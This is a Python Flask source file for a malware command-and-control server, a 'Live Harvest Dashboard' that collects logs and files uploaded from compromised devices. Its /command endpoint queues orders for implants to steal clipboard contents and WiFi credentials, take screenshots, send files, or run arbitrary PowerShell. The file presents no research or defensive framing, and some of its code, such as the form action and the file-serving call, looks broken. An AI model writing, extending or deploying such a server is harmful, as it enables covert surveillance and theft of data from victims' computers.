from flask import Flask, request, render_template_string
import os
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
harvest_logs = []

@app.route('/', methods=['GET'])
def dashboard():
    return render_template_string('''
        <h2>Live Harvest Dashboard</h2>
  <h3>REMOTE CONTROL COMMAND</h3>
<form method="post" action="/command/{{ selected_device }}">
    <label>Select device:</label>
    <select name="selected_device">
      {% for entry in logs|unique(attribute='device') %}
        <option value="{{ entry.device }}">{{ entry.device }}</option>
      {% endfor %}
    </select>
    <select name="cmd">
        <option value="clipboard">Extract Clipboard</option>
        <option value="wifi">Extract WiFi</option>
        <option value="screenshot">Screenshot</option>
        <option value="system_info">System Info</option>
        <option value="file">Send File</option>
        <option value="custom">Run Custom PowerShell</option>
    </select>
    <input type="text" name="arg" placeholder="(Optional file path or command)">
    <button type="submit">Send Command</button>
</form>
        <table border=1>
          <tr><th>Time</th><th>Device</th><th>Log/Event</th></tr>
          {% for entry in logs %}
          <tr>
            <td>{{ entry.time }}</td>
            <td>{{ entry.device }}</td>
            <td>{{ entry.log }}</td>
          </tr>
          {% endfor %}
        </table>
        <h3>Uploaded Files</h3>
        <ul>
        {% for fname in files %}
          <li><a href="/uploads/{{fname}}" target="_blank">{{ fname }}</a></li>
        {% endfor %}
        </ul>
    ''', logs=harvest_logs[-100:], files=os.listdir(UPLOAD_FOLDER))

@app.route('/upload', methods=['POST'])
def upload():
    device = request.form.get('device', 'Unknown')
    logmsg = request.form.get('log', '')
    t = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    harvest_logs.append(dict(time=t, device=device, log=logmsg))
    if 'file' in request.files:
        file = request.files['file']
        filename = f"{device}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file.filename}"
        file.save(os.path.join(UPLOAD_FOLDER, filename))
        harvest_logs.append(dict(time=t, device=device, log=f"Uploaded file: {filename}"))
    return 'OK'

@app.route('/uploads/<path:filename>')
def files(filename):
    return app.send_from_directory(UPLOAD_FOLDER, filename)

import os
from flask import jsonify

# Store queued commands for each device (C2 feature)
device_commands = {}

@app.route('/command/<device>', methods=['GET', 'POST'])
def command(device):
    global device_commands
    if request.method == 'POST':
        cmd = request.form.get('cmd')
        arg = request.form.get('arg')
        device_commands.setdefault(device, []).append((cmd, arg))
        # Log action for operator reference
        t = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        harvest_logs.append(dict(time=t, device=device, log=f"Command queued: {cmd} {arg}"))
        return "Queued"
    else:
        cmds = device_commands.get(device, [])
        if cmds:
            command = cmds.pop(0)
            return jsonify({'cmd': command[0], 'arg': command[1]})
        else:
            return jsonify({'cmd': 'noop', 'arg': ''})
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
